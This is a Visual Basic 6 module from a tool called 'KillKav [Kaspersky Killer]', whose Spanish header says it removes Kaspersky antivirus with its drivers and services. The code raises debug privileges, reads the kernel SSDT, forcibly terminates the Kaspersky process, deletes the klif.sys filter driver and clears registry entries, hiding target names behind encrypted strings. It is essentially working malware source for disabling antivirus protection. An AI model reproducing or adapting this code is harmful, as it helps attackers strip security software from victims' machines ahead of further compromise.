Attribute VB_Name = "mMain"
'---------------------------------------------------------------------------------------
' Projecto    : KillKav [Kaspersky Killer]
' Fecha       : 19/03/2009 18:10
' Autor       : XcryptOR
' Proposito   : Elimina el antivirus kaspersky incluido sus drivers y servicios
' Bugs        : Al Eliminar la entrada de Klim5.sys que es el filtro NDIS
'               No se va a poder ingresar normalmente a internet, toca ir a las propiedades
'               del adaptador de red y desinstalar el Kaspersky Anti-Virus NDIS Filter
'---------------------------------------------------------------------------------------
Private Sub Main()
    EnablePrivilege SE_DEBUG_PRIVILEGE, True
    FindNtdllExport
    GetSSDT
    Fuck_KAV
    KillRegs
    
End Sub
Private Sub Fuck_KAV()
    Dim hProcess        As Long
    Dim Pid             As Long
    
    Pid = GetPIDByName(Crypt("¹®¨ö½ ½"))
        
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, Pid)
    If hProcess = 0 Then
            hProcess = LzOpenProcess(PROCESS_ALL_ACCESS, Pid)
    End If
    
    Call MyTerminateProcess(hProcess, 0)
    
    If DeleteDriver(Crypt("„çç„›â„±¶¼·¯«„‹¡«¬½µëê„œª±®½ª«„“´±¾ö«¡«")) = True Then '\??\C:\Windows\System32\Drivers\Klif.sys
            MsgBox Crypt("œª±®½ªø“´±¾ö«¡«ø´±µ±¶¹¼·ø ±¬·«¹µ½¶¬½") & vbCrLf & _
                   Crypt("ùø“¹«¨½ª«³¡ø°¹ø«±¼·ø´±µ±¶¹¼·ø ±¬·«¹µ½¶¬½øy"), _
                   vbExclamation, Crypt("“¹«¨½ª«³¡ø“±´´½ªøõø›·¼½¼øš¡ø€»ª¡¨¬·ª")
    End If
End Sub

